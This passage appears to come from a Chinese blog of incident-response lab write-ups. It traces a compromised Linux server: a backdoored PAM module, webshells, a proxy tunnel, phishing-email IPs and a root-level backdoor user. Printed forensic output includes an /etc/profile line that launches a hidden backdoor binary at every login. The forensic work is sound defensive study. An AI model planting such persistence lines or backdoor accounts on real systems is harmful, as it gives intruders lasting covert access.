</span></span></code></pre></div><p>eq56里</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>哥斯拉webshell请求流量解密为:
</span></span><span style=display:flex><span>fileName  /tmp/pam_unix.sofileValue  NELF
</span></span></code></pre></div><h2 id=q12>Q12</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>12、黑客设置的后门密码是什么？
</span></span></code></pre></div><p>进入服务器</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-3:~# find / -name <span style=color:#e6db74>&#34;pam_unix.so&#34;</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/lib/x86_64-linux-gnu/security/pam_unix.so
</span></span><span style=display:flex><span>root@ip-10-0-10-3:~# cd /usr/lib/x86_64-linux-gnu/security/
</span></span><span style=display:flex><span>root@ip-10-0-10-3:/usr/lib/x86_64-linux-gnu/security# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>1328</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> root root   <span style=color:#ae81ff>4096</span> Dec <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>26</span> root root  <span style=color:#ae81ff>36864</span> Sep <span style=color:#ae81ff>19</span> 07:35 ..
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18632</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_access.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14400</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_debug.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>13968</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_deny.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14368</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_echo.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18560</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_env.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18752</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_exec.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14408</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_faildelay.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18608</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_filter.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14344</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_ftp.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18640</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_group.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14480</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_issue.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14376</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_keyinit.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18592</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_lastlog.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>26976</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_limits.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14408</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_listfile.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14344</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_localuser.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14432</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_loginuid.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14408</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_mail.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14384</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_mkhomedir.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14440</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_motd.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>43744</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_namespace.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14360</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_nologin.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14296</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_permit.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18696</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_pwhistory.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14328</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_rhosts.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14400</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_rootok.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14400</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_securetty.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>22840</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_selinux.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18664</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_sepermit.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14344</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_shells.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18480</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_stress.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18536</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_succeed_if.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>286840</span> Jun <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2023</span> pam_systemd.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18608</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_tally2.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18568</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_tally.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>18608</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_time.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>22880</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_timestamp.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14424</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_tty_audit.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14472</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_umask.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>216744</span> Sep <span style=color:#ae81ff>19</span> 09:04 pam_unix.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14456</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_userdb.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14296</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_warn.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>14352</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_wheel.so
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>22944</span> Feb <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2019</span> pam_xauth.so
</span></span><span style=display:flex><span>root@ip-10-0-10-3:/usr/lib/x86_64-linux-gnu/security# file pam_unix.so
</span></span><span style=display:flex><span>pam_unix.so: ELF 64-bit LSB shared object, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>b823fd038f580c704c3c8e26f383e82b7cdb5f59, with debug_info, not stripped
</span></span></code></pre></div><p>把文件下载到本地</p><pre tabindex=0><code>flag{XJ@123}
</code></pre><p><img alt=2025-03-09183755 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09183755.png></p><h2 id=q13>Q13</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>13、黑客的恶意dnslog服务器地址是什么？
</span></span></code></pre></div><pre tabindex=0><code>flag{c0ee2ad2d8.ipv6.xxx.eu.org.}
</code></pre><p>同上，但论做题的话很多流程都是一样的知识点我没细入。</p><h1 id=第七章-常见攻击事件分析钓鱼邮件>第七章 常见攻击事件分析&ndash;钓鱼邮件</h1><h2 id=q1-18>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44}
</span></span></code></pre></div><p><img alt=2025-03-09215030 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09215030.png></p><pre tabindex=0><code>flag{121.204.224.15}
</code></pre><h2 id=q2-18>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44}
</span></span></code></pre></div><p>把eml放在安恒云沙盒里跑一下</p><p><img alt=2025-03-09220123 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09220123.png></p><pre tabindex=0><code>flag{107.16.111.57}
</code></pre><h2 id=q3-18>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php}
</span></span></code></pre></div><p>用d盾扫一下</p><pre tabindex=0><code>flag{/var/www/html/admin/ebak/ReData.php}
</code></pre><h2 id=q4-15>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell}
</span></span></code></pre></div><p>攻击者修改my.conf文件 进行了socks5代理</p><pre tabindex=0><code>/var/tmp/proc/mysql
</code></pre><h1 id=第九章-blueteam-的小心思>第九章-blueteam 的小心思</h1><h2 id=q1-19>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# ls /
</span></span><span style=display:flex><span>bin    etc             lib         mnt   run   swap.img  var
</span></span><span style=display:flex><span>boot   home            lib64       opt   sbin  sys       vmlinuz
</span></span><span style=display:flex><span>cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old
</span></span><span style=display:flex><span>dev    initrd.img.old  media       root  srv   usr       wireshark.pcap
</span></span></code></pre></div><p>下载分析一下流量包</p><p><img alt=2025-03-06193354 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-06193354.png></p><p>主要分析login.php那里有几个密码，挨个试一下得到</p><pre tabindex=0><code>Form item: &#34;password&#34; = &#34;Aa12345^&#34;
flag{D63EDB0E9DF4CF411398E3658C0237E0}
</code></pre><h2 id=q2-19>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串&#34;upload.php&#34;的小写md5值，格式flag{md5}。
</span></span></code></pre></div><p>先看流量包最后几条都是进行的命令执行，往前翻</p><p><img alt=2025-03-06193736 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-06193736.png></p><p>有一处upload</p><pre tabindex=0><code>897	98.458872	192.168.16.43	192.168.18.24	HTTP	682	POST /pluginmgr.php?op=upload HTTP/1.1  (application/zip)
</code></pre><pre tabindex=0><code>flag{B05C0BE368FFA72E6CB2DF7E1E1B27BE}
</code></pre><h2 id=q3-19>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。
</span></span></code></pre></div><p>在这条流量包往后翻就能看到了是<code>cpg.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# find / -type f -name <span style=color:#e6db74>&#34;cpg.php&#34;</span>
</span></span><span style=display:flex><span>/var/www/html/plugins/cpg.php
</span></span><span style=display:flex><span>root@ubuntu18:~# md5sum /var/www/html/plugins/cpg.php
</span></span><span style=display:flex><span>a097b773ced57bb7d51c6719fe8fe5f5  /var/www/html/plugins/cpg.php
</span></span></code></pre></div><h2 id=q4-16>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。
</span></span></code></pre></div><p><img alt=2025-03-06194335 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-06194335.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# find / -type f -name <span style=color:#e6db74>&#34;is.world&#34;</span>
</span></span><span style=display:flex><span>/var/www/html/plugins/.       /is.world
</span></span><span style=display:flex><span>root@ubuntu18:~# md5sum <span style=color:#e6db74>&#34;/var/www/html/plugins/.       /is.world&#34;</span>
</span></span><span style=display:flex><span>ee279c39bf3dcb225093bdbafeb9a439  /var/www/html/plugins/.       /is.world
</span></span></code></pre></div><h2 id=q5-12>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串&#34;attack&#34;的小写md5值，格式flag{md5}。
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# cat /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>lxd:x:105:65534::/var/lib/lxd/:/bin/false
</span></span><span style=display:flex><span>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:109:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>knowledgegraphd:x:0:0::/home/knowledgegraphd:/bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>knowledgegraphd
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>4CDA3461543C9A770A3349760594FACD<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=q6-5>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# cat /etc/profile
</span></span><span style=display:flex><span><span style=color:#75715e># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>PS1-<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>BASH-<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;</span>$BASH<span style=color:#e6db74>&#34;</span> !<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/bin/sh&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># The file bash.bashrc already sets the default PS1.</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># PS1=&#39;\h:\w\$ &#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -f /etc/bash.bashrc <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>      . /etc/bash.bashrc
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>&#34;`id -u`&#34;</span> -eq <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>      PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;# &#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      PS1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;$ &#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/var/www/html/plugins/<span style=color:#e6db74>&#34;.       &#34;</span>/is.world &amp;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -d /etc/profile.d <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> i in /etc/profile.d/*.sh; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -r $i <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>      . $i
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>  unset i
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>root@ubuntu18:~# md5sum /etc/profile
</span></span><span style=display:flex><span>65bf3e4a9ac90d75ec28be0317775618  /etc/profile
</span></span></code></pre></div><h2 id=q7-4>Q7</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu18:~# cat /root/.bashrc
</span></span><span style=display:flex><span><span style=color:#75715e># ~/.bashrc: executed by bash(1) for non-login shells.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># for examples</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># If not running interactively, don&#39;t do anything</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> -z <span style=color:#e6db74>&#34;</span>$PS1<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># don&#39;t put duplicate lines in the history. See bash(1) for more options</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ... or force ignoredups and ignorespace</span>
</span></span><span style=display:flex><span>HISTCONTROL<span style=color:#f92672>=</span>ignoredups:ignorespace
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># append to the history file, don&#39;t overwrite it</span>
</span></span><span style=display:flex><span>shopt -s histappend
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span>
</span></span><span style=display:flex><span>HISTSIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>HISTFILESIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>2000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># check the window size after each command and, if necessary,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># update the values of LINES and COLUMNS.</span>
</span></span><span style=display:flex><span>shopt -s checkwinsize
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># make less more friendly for non-text input files, see lesspipe(1)</span>
